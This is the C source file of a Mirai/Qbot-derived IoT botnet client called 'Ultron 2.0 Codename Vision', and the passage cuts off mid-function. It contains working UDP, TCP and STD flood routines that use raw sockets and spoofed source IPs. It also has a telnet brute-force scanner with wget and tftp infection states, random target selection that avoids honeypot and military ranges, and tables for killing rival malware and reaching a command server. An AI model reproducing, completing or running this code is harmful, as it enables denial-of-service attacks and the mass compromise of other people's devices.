#pragma clang diagnostic push
#pragma ide diagnostic ignored "cert-msc50-cpp"
/*
    Created by: Forsaken
    Title: Ultron 2.0 Codename Vision
    Release: Test build 3
    Disclaimer: This is private unreleased code, do not distribute or release this code.
 */

//#define _GNU_SOURCE
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wvisibility"
#define PR_SET_NAME 15
#define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define INET_ADDR(o1,o2,o3,o4) (htonl(((o1) << 24) | ((o2) << 16) | ((o3) << 8) | ((o4) << 0)))
#define SOCK_BUFSIZE 2048
#define SINGLE_INSTANCE_PORT 48101
#define SCANNER_RDBUF_SIZE  256
#define SCANNER_HACK_DRAIN  64
#define SCANNER_MAX_CONNS   128
#define SCANNER_RAW_PPS     160
//
#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <time.h>
#include <dirent.h>
#include <limits.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/param.h>
#include <sys/time.h>
#include <linux/if_ether.h>
#include <ctype.h>
#include <sys/prctl.h>
////////////////
/*Bot Enables */
////////////////

/////////////////
typedef uint32_t ipv4_t;
typedef uint16_t port_t;

struct scanner_auth {
    char *username;
    char *password;
    uint16_t weight_min, weight_max;
    uint8_t username_len, password_len;
};
struct scanner_connection {
    struct scanner_auth *auth;
    int fd, last_recv;
    enum {
        SC_CLOSED,
        SC_CONNECTING,
        SC_HANDLE_IACS,
        SC_WAITING_USERNAME,
        SC_WAITING_PASSWORD,
        SC_WAITING_RESP,
        SC_PARSE_ELF_RESPONSE,
        SC_INFECTION_PAYLOAD_DETECTION,
        SC_INFECTION_PAYLOAD_WGET,
        SC_INFECTION_PAYLOAD_TFTP,
        SC_INFECTION_PAYLOAD_ECHO,
        SC_REBOOT_SURIVAL, 
        SC_WAITING_TOKEN_RESP
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[SCANNER_RDBUF_SIZE];
    char arch[32];
    uint8_t tries;
    uint8_t endianness;
    uint8_t dropper_index;
    uint8_t bit;
    uint32_t machine;
};

char *getBuild()
{
#if defined(__x86_64__) || defined(_M_X64)
        return "x86_64";
#elif defined(__i386) || defined(_M_IX86)
        return "x86_32";
#elif defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
        return "ARM-4";
#elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
        return "ARM-5";
#elif defined(__ARM_ARCH_6_) || defined(__ARM_ARCH_6T2_)
        return "ARM-6";
#elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7S__)
        return "ARM-7";
#elif defined(_mips__mips) || defined(__mips) || defined(__MIPS_) || defined(_mips)
        return "MIPS";
#elif defined(__sh__)
        return "SUPERH";
#elif defined(__powerpc) || defined(__powerpc_) || defined(_ppc_) || defined(__PPC__) || defined(_ARCH_PPC)
        return "POWERPC";
#elif defined(_ARCH_440)
        return "POWERPC-440";
#else
        return "UNKNOWN";
#endif
}
char *bindetection() {
#if defined(__x86_64__) || defined(_M_X64)
    return "vision.x86_64";
#elif defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "vision.armv4l";
#elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "vision.armv5l";
#elif defined(__ARM_ARCH_6_) || defined(__ARM_ARCH_6T2_)
    return "vision.armv6l";
#elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7S__)
    return "vision.armv7l";
#elif defined(_mips__mips) || defined(__mips) || defined(__MIPS_) || defined(_mips)
    return "vision.mips";
#elif defined(__sh__)
    return "vision.sh4";
#elif defined(__powerpc) || defined(__powerpc_) || defined(_ppc_) || defined(__PPC__) || defined(_ARCH_PPC)
    return "vision.powerpc";
#elif defined(_ARCH_440)
    return "vision.powerpc440fp";
#else
    return "UNKNOWN";
#endif
}

struct resolv_entries {
    uint8_t addrs_len;
    ipv4_t *addrs;
};


struct dnshdr {
    uint16_t id, opts, qdcount, ancount, nscount, arcount;
};

struct dns_question {
    uint16_t qtype, qclass;
};

struct dns_resource {
    uint16_t type, _class;
    uint32_t ttl;
    uint16_t data_len;
} __attribute__((packed));


int initConnection();
void makeRandomStr(unsigned char *buf, int length);
int sockprintf(int sock, char *formatStr, ...);

int mainCommSock = 0, currentServer = -1;
uint32_t *pids;
uint64_t numpids = 0;
struct in_addr ourIP;

char *commServer = "127.0.0.1";
char *binaryhostaddr = "127.0.0.1";
int port = 443;


//////////////////////////
#define PHI 0x9e3779b9
static uint32_t Q[4096], c = 362436;
void init_rand(uint32_t x)
{
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++)
                Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (uint32_t)(t >> 32);
        x = (uint32_t) (t + c);
        if (x < c)
        {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}
void trim(char *str)
{
        int i;
        int begin = 0;
        int end = (int) (strlen(str) - 1);

        while (isspace(str[begin]))
                begin++;

        while ((end >= begin) && isspace(str[end]))
                end--;
        for (i = begin; i <= end; i++)
                str[i - begin] = str[i];

        str[i - begin] = '\0';
}

void printchar(unsigned char **str, int c) {
    if (**str) {
        **str = c;
        ++(**str);
    }
    else
        (void)write(1, &c, 1);
}
static int prints(unsigned char **out, const unsigned char *string, int width, int pad) {
    register int pc = 0, padchar = ' ';
    if (width > 0) {
        register int len = 0;
        register const unsigned char *ptr;
        for (ptr = string; *ptr; ++ptr)
            ++len;
        if (len >= width)
            width = 0;
        else width -= len;
        if (pad & PAD_ZERO)
                padchar = '0';
    }
    if (!(pad & PAD_RIGHT)) {
        for (; width > 0; --width) {
            printchar(out, padchar);
            ++pc;
        }
    }

    for (; *string; ++string) {
        printchar(out, *string);
        ++pc;
    }
    for (; width > 0; --width) {
        printchar(out, padchar);
        ++pc;
    }
    return pc;
}
static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
    unsigned char print_buf[PRINT_BUF_LEN];
    register unsigned char *s;
    register int t, neg = 0, pc = 0;
    register unsigned int u = (unsigned int) i;
    if (i == 0)
    {
        print_buf[0] = '0';
        print_buf[1] = '\0';
        return prints(out, print_buf, width, pad);
    }
    if (sg && b == 10 && i < 0)
    {
        neg = 1;
        u = (unsigned int) -i;
    }

    s = print_buf + PRINT_BUF_LEN - 1;
    *s = '\0';
    while (u)
    {
        t = u % b;
        if (t >= 10)
            t += letbase - '0' - 10;
        *--s = (unsigned char) (t + '0');
        u /= b;
    }
    if (neg)
    {
        if (width && (pad & PAD_ZERO))
        {
            printchar(out, '-');
            ++pc;
            --width;
        }
        else
        {
            *--s = '-';
        }
    }

    return pc + prints(out, s, width, pad);
}
int print(unsigned char **out, const unsigned char *format, va_list args) {
    register int width, pad;
    register int pc = 0;
    unsigned char scr[2];
    for (; *format != 0; ++format)
    {
        if (*format == '%')
        {
            ++format;
            width = pad = 0;
            if (*format == '\0')
                break;
            if (*format == '%')
                goto out;
            if (*format == '-')
            {
                ++format;
                pad = PAD_RIGHT;
            }
            while (*format == '0')
            {
                ++format;
                pad |= PAD_ZERO;
            }
            for (; *format >= '0' && *format <= '9'; ++format)
            {
                width *= 10;
                width += *format - '0';
            }
            if (*format == 's')
            {
                register char *s;
                s = (char *)va_arg(args, int);
                pc += prints(out, (s?s: "(null)"), width, pad);
                continue;
            }
            if (*format == 'd')
            {
                pc += printi(out, va_arg(args, int), 10, 1, width, pad, 'a');
                continue;
            }
            if (*format == 'x')
            {
                pc += printi(out, va_arg(args, int), 16, 0, width, pad, 'a');
                continue;
            }
            if (*format == 'X')
            {
                pc += printi(out, va_arg(args, int), 16, 0, width, pad, 'A');
                continue;
            }
            if (*format == 'u')
            {
                pc += printi(out, va_arg(args, int), 10, 0, width, pad, 'a');
                continue;
            }
            if (*format == 'c')
            {
                scr[0] = (unsigned char)va_arg(args, int);
                scr[1] = '\0';
                pc += prints(out, scr, width, pad);
                continue;
            }
        }
        else
        {
            out:
                printchar(out, *format);
                ++pc;
        }
        if(out) **out = "\0";
        va_end(args);
    }
    return pc;
}
int szprintf(unsigned char *out, const unsigned char *format, ...)
{
        va_list args;
        va_start(args, format);
        return print(&out, format, args);
}
int sockprintf(int sock, char *string, ...) {
    char buffer[SOCK_BUFSIZE];
    memset(buffer, 0, SOCK_BUFSIZE);

    va_list args;
    va_start(args, string);
    vsprintf(buffer, string, args);
    va_end(args);
    return send(sock, buffer, strlen(buffer), MSG_NOSIGNAL);
}
int wildString(const unsigned char *pattern, const unsigned char *string)
{
        switch (*pattern)
        {
        case '\0':
                return *string;
        case '*':
                return !(!wildString(pattern + 1, string) || !(!*string || wildString(pattern, string + 1)));
        case '?':
                return !(*string && !wildString(pattern + 1, string + 1));
        default:
                return !((toupper(*pattern) == toupper(*string)) && !wildString(pattern + 1, string + 1));
        }
}
int getHost(unsigned char *toGet, struct in_addr *i)
{
        if ((i->s_addr = inet_addr((const char *) toGet)) == -1)
                return 1;
        return 0;
}
void makeRandomStr(unsigned char *buf, int length)
{
        int i = 0;
        for (i = 0; i < length; i++)
                buf[i] = (unsigned char) ((rand_cmwc() % (91 - 65)) + 65);
}
int recvLine(int socket, unsigned char *buf, int bufsize)
{
        memset(buf, 0, (size_t) bufsize);
        fd_set myset;
        struct timeval tv;
        tv.tv_sec = 30;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_SET(socket, &myset);
        int retryCount = 0;
        if ((select(socket + 1, &myset, NULL, &myset, &tv)) <= 0)
        {
                while (retryCount < 10)
                {
                        tv.tv_sec = 30;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(socket, &myset);
                        if ((select(socket + 1, &myset, NULL, &myset, &tv)) <= 0)
                        {
                                retryCount++;
                                continue;
                        }
                        break;
                }
        }
        unsigned char tmpchr;
        unsigned char *cp;
        int count = 0;
        cp = buf;
        while (bufsize-- > 1)
        {
                if (recv(mainCommSock, &tmpchr, 1, 0) != 1)
                {
                        *cp = 0x00;
                        return -1;
                }
                *cp++ = tmpchr;
                if (tmpchr == '\n')
                        break;
                count++;
        }
        *cp = 0x00;
        return count;
}
int connectTimeout(int fd, char *host, int port, int timeout)
{
        struct sockaddr_in dest_addr;
        fd_set myset;
        struct timeval tv;
        socklen_t lon;
        int valopt;
        long arg = fcntl(fd, F_GETFL, NULL);
        arg |= O_NONBLOCK;
        fcntl(fd, F_SETFL, arg);
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons((uint16_t) port);
        if (getHost((unsigned char *) host, &dest_addr.sin_addr))
                return 0;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        if (res < 0)
        {
                if (errno == EINPROGRESS)
                {
                        tv.tv_sec = timeout;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(fd, &myset);
                        if (select(fd + 1, NULL, &myset, NULL, &tv) > 0)
                        {
                                lon = sizeof(int);
                                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void *)(&valopt), &lon);
                                if (valopt)
                                        return 0;
                        }
                        else
                                return 0;
                }
                else
                        return 0;
        }
        arg = fcntl(fd, F_GETFL, NULL);
        arg &= (~O_NONBLOCK);
        fcntl(fd, F_SETFL, arg);
        return 1;
}
int listFork()
{
        uint32_t parent, i, *newpids;
        parent = (uint32_t) fork();
        if (parent <= 0)
                return parent;
        numpids++;
        newpids = (uint32_t *)malloc((numpids + 1) * 4);
        for (i = 0; i < numpids - 1; i++)
                newpids[i] = pids[i];
        newpids[numpids - 1] = parent;
        free(pids);
        pids = newpids;
        return parent;
}
/*
in_addr_t getRandomPublicIP()
{
        static uint8_t ipState[4] = {0};
        ipState[0] = (uint8_t) (rand() % 223);
        ipState[1] = (uint8_t) (rand() % 255);
        ipState[2] = (uint8_t) (rand() % 255);
        ipState[3] = (uint8_t) (rand() % 255);
        while (
            (ipState[0] == 0) ||
            (ipState[0] == 10) ||
            (ipState[0] == 100 && (ipState[1] >= 64 && ipState[1] <= 127)) ||
			(ipState[0] == 106 && ipState[1] == 186) ||               // 106.186.0.0/16   - honeypot
			(ipState[0] == 106 && ipState[1] == 187) ||               // 106.187.0.0/16   - honeypot
            (ipState[0] == 127) ||
			(ipState[0] == 106 && ipState[1] == 185) ||               // 106.187.0.0/16   - honeypot
			(ipState[0] == 106 && ipState[1] == 184) ||               // 106.187.0.0/16   - honeypot
			(ipState[0] == 150 && ipState[1] == 31) ||                // 150.31.0.0/16    - honeypot
			(ipState[0] == 49 && ipState[1] == 51) ||                 // 49.51.0.0/16     - honeypot
			(ipState[0] == 178 && ipState[1] == 62) ||                // 178.62.0.0/16    - honeypot
			(ipState[0] == 160 && ipState[1] == 13) ||           // 160.13.0.0/16    - honeypot
            (ipState[0] == 169 && ipState[1] == 254) ||
            (ipState[0] == 172 && (ipState[1] <= 16 && ipState[2] <= 31)) ||
            (ipState[0] == 192 && ipState[1] == 0 && ipState[2] == 2) ||
            (ipState[0] == 192 && ipState[1] == 88 && ipState[2] == 99) ||
            (ipState[0] == 192 && ipState[1] == 168) ||
            (ipState[0] == 198 && (ipState[1] == 18 || ipState[1] == 19)) ||
            (ipState[0] == 198 && ipState[1] == 51 && ipState[2] == 100) ||
            (ipState[0] == 203 && ipState[1] == 0 && ipState[2] == 113) ||
            (ipState[0] >= 224))
        {
                ipState[0] = (uint8_t) (rand() % 223);
                ipState[1] = (uint8_t) (rand() % 255);
                ipState[2] = (uint8_t) (rand() % 255);
                ipState[3] = (uint8_t) (rand() % 255);
        }
        char ip[16] = {0};
        szprintf((unsigned char *) ip, (const unsigned char *) "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
        return inet_addr(ip);
}
*/
//////////////////////
/*     Mirai rand   */
//////////////////////

static uint32_t x, y, z, w;

void rand_init(void) {
    x = (uint32_t) time(NULL);
    y = (uint32_t) (getpid() ^ getppid());
    z = (uint32_t) clock();
    w = z ^ y;
}

uint32_t rand_next(void) //period 2^96-1
{
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y; y = z; z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}
static ipv4_t get_random_ipv4(void) {
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;

    do {
        tmp = rand_next();
        o1 = (uint8_t) (tmp & 0xff);
        o2 = (uint8_t) ((uint8_t)(tmp >> 8) & 0xff);
        o3 = (uint8_t) ((uint8_t)(tmp >> 16) & 0xff);
        o4 = (uint8_t) ((uint8_t)(tmp >> 24) & 0xff);
    }
    while(o1 == 127 ||                          //127.0.0.0/8    - Loopback.
         (o1 == 0) ||                           //0.0.0.0/8      - Invalid address space.
         (o1 == 3) ||                           //3.0.0.0/8      - General Electric Company.
         (o1 == 15 || o1 == 16) ||              //15.0.0.0/7     - Hewlett-Packard Company.
         (o1 == 56) ||                          //56.0.0.0/8     - USPS.
         (o1 == 10) ||                          //10.0.0.0/8     - Internal Network.
         (o1 == 192 && o2 == 168) ||            //192.168.0.0/16 - Internal Network.
         (o1 == 172 && o2 >= 16 && o2 < 32) ||  //172.16.0.0/14  - Internal network.
         (o1 == 100 && o2 >= 64 && o2 < 127) || //100.64.0.0/10  - IANA NAT reserved.
         (o1 == 169 && o2 > 254) ||             //169.254.0.0/16 - IANA NAT reserved.
         (o1 == 198 && o2 >= 18 && o2 < 20) ||  //198.18.0.0/15  - IANA Special use.
         (o1 == 106 && o2 == 184) ||            //105.184.0.0/16 - Honeypot
         (o1 == 106 && o2 == 185) ||            //106.185.0.0/16 - Honeypot
         (o1 == 106 && o2 == 186) ||            //106.186.0.0/16 - Honeypot
         (o1 == 106 && o2 == 187) ||            //106.187.0.0/16 - Honeypot
         (o1 == 150 && o2 == 31) ||             //150.31.0.0/16  - Honeypot
         (o1 == 49 && o2 == 51) ||              //49.51.0.0/16   - Honeypot
         (o1 == 178 && o2 == 51)||              //178.62.0.0/16  - Honeypot
         (o1 == 160 && o2 == 13) ||             //160.13.0.0/16  - Honeypot
         /*Department of Defense*/
         (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215)
    );
    return INET_ADDR(o1,o2,o3,o4);
}
//////////////////////////

in_addr_t getRandomIP(in_addr_t netmask) {
        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
        return tmp ^ (rand_cmwc() & ~netmask);
}
unsigned short csum(unsigned short *buf, int count) {
        register uint64_t sum = 0;
        while (count > 1) {
                sum += *buf++;
                count -= 2;
        }
        if (count > 0) {
                sum += *(unsigned char *)buf;
        }
        while (sum >> 16) {
                sum = (sum & 0xffff) + (sum >> 16);
        }
        return (uint16_t)(~sum);
}
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
        struct tcp_pseudo {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        pseudohead.src_addr = iph->saddr;
        pseudohead.dst_addr = iph->daddr;
        pseudohead.zero = 0;
        pseudohead.proto = IPPROTO_TCP;
        pseudohead.length = htons(sizeof(struct tcphdr));
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
        unsigned short *tcp = malloc((size_t) totaltcp_len);
        memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr));
        unsigned short output = csum(tcp, totaltcp_len);
        free(tcp);
        return output;
}
void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize;
        iph->id = (uint16_t) rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}

void SendSTD(unsigned char *ip, int port, int secs)
{
        int iSTD_Sock;
        iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
        time_t start = time(NULL);
        struct sockaddr_in sin;
        struct hostent *hp;
        hp = gethostbyname((const char *) ip);
        bzero((char *)&sin, sizeof(sin));
        bcopy(hp->h_addr, (char *)&sin.sin_addr, (size_t) hp->h_length);
        sin.sin_family = (sa_family_t) hp->h_addrtype;
        sin.sin_port = (in_port_t) port;
        unsigned int a = 0;
        while (1)
        {
                if (a >= 50)
                {
                        send(iSTD_Sock, "std", 69, 0);
                        connect(iSTD_Sock, (struct sockaddr *)&sin, sizeof(sin));
                        if (time(NULL) >= start + secs)
                        {
                                close(iSTD_Sock);
                                _exit(0);
                        }
                        a = 0;
                }
                a++;
        }
}
void SendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int pollinterval, int spoofit)
{
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        if (port == 0)
                dest_addr.sin_port = (in_port_t) rand_cmwc();
        else
                dest_addr.sin_port = htons((uint16_t) port);
        if (getHost(target, &dest_addr.sin_addr))
                return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        register unsigned int pollRegister;
        pollRegister = (unsigned int) pollinterval;
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if (!sockfd)
        {
                return;
        }
        int tmp = 1;
        if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0)
        {
                return;
        }
        int counter = 50;
        while (counter--)
        {
                srand((unsigned int) (time(NULL) ^ rand_cmwc()));
                init_rand((uint32_t) rand());
        }
        in_addr_t netmask;
        netmask = (in_addr_t) (~((1 << (32 - spoofit)) - 1));
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl(getRandomIP(netmask)), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
        udph->len = htons(sizeof(struct udphdr) + packetsize);
        udph->source = (uint16_t) rand_cmwc();
        udph->dest = (uint16_t) (port == 0 ? rand_cmwc() : htons((uint16_t) port));
        udph->check = 0;
        makeRandomStr(((unsigned char *)udph) + sizeof(struct udphdr), packetsize);
        iph->check = csum((unsigned short *)packet, iph->tot_len);
        int end;
        end = (int) (time(NULL) + timeEnd);
        register unsigned int i = 0;
        while (1)
        {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
                udph->source = (uint16_t) rand_cmwc();
                udph->dest = (uint16_t) (port == 0 ? rand_cmwc() : htons((uint16_t) port));
                iph->id = (uint16_t) rand_cmwc();
                iph->saddr = htonl(getRandomIP(netmask));
                iph->check = csum((unsigned short *)packet, iph->tot_len);
                if (i == pollRegister)
                {
                        if (time(NULL) > end)
                                break;
                        i = 0;
                        continue;
                }
                i++;
        }
}
void SendTCP(unsigned char *target, int port, int timeEnd, unsigned char *flags, int packetsize, int pollinterval, int spoofit)
{
        register unsigned int pollRegister;
        pollRegister = (unsigned int) pollinterval;
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        if (port == 0)
                dest_addr.sin_port = (in_port_t) rand_cmwc();
        else
                dest_addr.sin_port = htons((uint16_t) port);
        if (getHost(target, &dest_addr.sin_addr))
                return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if (!sockfd)
        {
                return;
        }
        int tmp = 1;
        if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0)
        {
                return;
        }
        in_addr_t netmask;
        if (spoofit == 0)
                netmask = (~((in_addr_t)-1));
        else
                netmask = (in_addr_t) (~((1 << (32 - spoofit)) - 1));
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl(getRandomIP(netmask)), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);
        tcph->source = (uint16_t) rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;
        if (!strcmp((const char *) flags, "all"))
        {
                tcph->syn = 1;
                tcph->rst = 1;
                tcph->fin = 1;
                tcph->ack = 1;
                tcph->psh = 1;
        }
        else
        {
                unsigned char *pch = (unsigned char *) strtok((char *) flags, ",");
                while (pch)
                {
                        if (!strcmp((const char *) pch, "syn"))
                        {
                                tcph->syn = 1;
                        }
                        else if (!strcmp((const char *) pch, "rst"))
                        {
                                tcph->rst = 1;
                        }
                        else if (!strcmp((const char *) pch, "fin"))
                        {
                                tcph->fin = 1;
                        }
                        else if (!strcmp((const char *) pch, "ack"))
                        {
                                tcph->ack = 1;
                        }
                        else if (!strcmp((const char *) pch, "psh"))
                        {
                                tcph->psh = 1;
                        }
                        else
                        {
                        }
                        pch = strtok(NULL, ",");
                }
        }
        tcph->window = (uint16_t) rand_cmwc();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (uint16_t) (port == 0 ? rand_cmwc() : htons((uint16_t) port));
        tcph->check = tcpcsum(iph, tcph);
        iph->check = csum((unsigned short *)packet, iph->tot_len);
        int end = (int) (time(NULL) + timeEnd);
        register unsigned int i = 0;
        while (1)
        {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
                iph->saddr = htonl(getRandomIP(netmask));
                iph->id = (uint16_t) rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = (uint16_t) rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum((unsigned short *)packet, iph->tot_len);
                if (i == pollRegister)
                {
                        if (time(NULL) > end)
                                break;
                        i = 0;
                        continue;
                }
                i++;
        }
}


//////////////////////
/* Mirai Typedefs   */
//////////////////////
typedef char BOOL;


//////////////////////
/* Mirai Structs    */
//////////////////////
struct attack_target {
    struct sockaddr_in sock_addr;
    ipv4_t addr;
    uint8_t netmask;
};
struct attack_option {
    char *val;
    uint8_t key;
};
typedef void (*ATTACK_FUNC) (uint8_t, struct attack_target *, uint8_t, struct attack_option *);
typedef uint8_t ATTACK_VECTOR;
struct attack_method {
    ATTACK_FUNC func;
    ATTACK_VECTOR vector;
};
uint8_t methods_len = 0;
struct attack_method **methods = NULL;
ipv4_t LOCAL_ADDR;

//////////////////////
/*  Mirai Defines   */
//////////////////////
#define FALSE   0
#define TRUE    1

#define PROTO_DNS_QTYPE_A       1
#define PROTO_DNS_QCLASS_IP     1

#define KILLER_MIN_PID              400
#define KILLER_RESTART_SCAN_TIME    600

#define TABLE_CNC_DOMAIN                    1
#define TABLE_CNC_PORT                      2
#define TABLE_SCAN_CB_DOMAIN                3 /* domain to connect to */
#define TABLE_SCAN_CB_PORT                  4
/* Killer data */
#define TABLE_KILLER_SAFE                   5
#define TABLE_KILLER_PROC                   6
#define TABLE_KILLER_EXE                    7
#define TABLE_KILLER_DELETED                8   /* " (deleted)" */
#define TABLE_KILLER_FD                     9   /* "/fd" */
#define TABLE_KILLER_ANIME                  10  /* .anime */
#define TABLE_KILLER_STATUS                 11
#define TABLE_MEM_QBOT                      12
#define TABLE_MEM_QBOT2                     13
#define TABLE_MEM_QBOT3                     14
#define TABLE_MEM_UPX                       15
#define TABLE_MEM_ZOLLARD                   16
#define TABLE_MEM_REMAITEN                  17
#define TABLE_MEM_REMAITEN2                 18
#define TABLE_MEM_REMAITEN3                 19
#define TABLE_MEM_REMAITEN4                 20
#define TABLE_MEM_REMAITEN5                 21
#define TABLE_MEM_REMAITEN6                 22
#define TABLE_MEM_REMAITEN7                 23
#define TABLE_MEM_REMAITEN8                 24
#define TABLE_MEM_MIRAI                     25
#define TABLE_MEM_MIRAI2                    26
#define TABLE_MEM_SATORI                    27
#define TABLE_MEM_SATORI2                   28
#define TABLE_SCAN_SHELL                    29
#define TABLE_SCAN_ENABLE                   30
#define TABLE_SCAN_SYSTEM                   31
#define TABLE_SCAN_SH                       32
#define TABLE_SCAN_QUERY                    33
#define TABLE_SCAN_RESP                     34
#define TABLE_SCAN_ELF_RESP                 35
#define TABLE_SCAN_NCORRECT                 36
#define TABLE_SCAN_PS                       37
#define TABLE_SCAN_KILL_9                   38
#define TABLE_SCAN_MACHINE_ARM              39
#define TABLE_SCAN_MACHINE_SPARC            40
#define TABLE_SCAN_MACHINE_I686             41
#define TABLE_SCAN_MACHINE_M68K             42
#define TABLE_SCAN_MACHINE_PPC              43
#define TABLE_SCAN_MACHINE_ARC              44
#define TABLE_SCAN_MACHINE_SH4              45
#define TABLE_SCAN_MACHINE_X86_64           46
#define TABLE_SCAN_MACHINE_MIPS             47
#define TABLE_SCAN_MACHINE_MIPSEL           48
#define TABLE_SCAN_INFECTION_METHOD_TEST    49
#define TABLE_SCAN_WGET_SUCCESS_RESP        50
#define TABLE_SCAN_TFTP_SUCCESS_RESP        51
#define TABLE_SCAN_PAYLOAD_WGET             52
#define TABLE_SCAN_PAYLOAD_TFTP             53
#define TABLE_PC_PONG                       54
#define TABLE_PC_UDP                        55
#define TABLE_PC_TCP                        56
#define TABLE_PC_STD                        57
#define TABLE_PC_INIT_TELNET                58
#define TABLE_PC_SCAN_KILL                  59
#define TABLE_PC_KILLATK                    60
#define TABLE_PC_KILL                       61
#define TABLE_PC_XERXES                     62

/* Scanner data */
#define TABLE_MAX_KEYS  63 /* Highest value + 1 */

//////////////////////
/*  Mirai Utilities */
//////////////////////
char *util_fdgets(char *buffer, int buffer_size, int fd)
{
    int got = 0, total = 0;
    do
    {
        got = (int) read(fd, buffer + total, 1);
        total = got == 1 ? total + 1 : total;
    }
    while (got == 1 && total < buffer_size && *(buffer + (total - 1)) != '\n');

    return total == 0 ? NULL : buffer;
}
void util_zero(void *buf, int len)
{
    char *zero = buf;
    while (len--)
        *zero++ = 0;
}
int util_strlen(char *str)
{
        int c = 0;
        while (*str++ != 0)
                c++;
        return c;
}

int util_stristr(char *haystack, int haystack_len, char *str)
{
    char *ptr = haystack;
    int str_len = util_strlen(str);
    int match_count = 0;

    while (haystack_len-- > 0)
    {
        char a = *ptr++;
        char b = str[match_count];
        a = (char) (a >= 'A' && a <= 'Z' ? a | 0x60 : a);
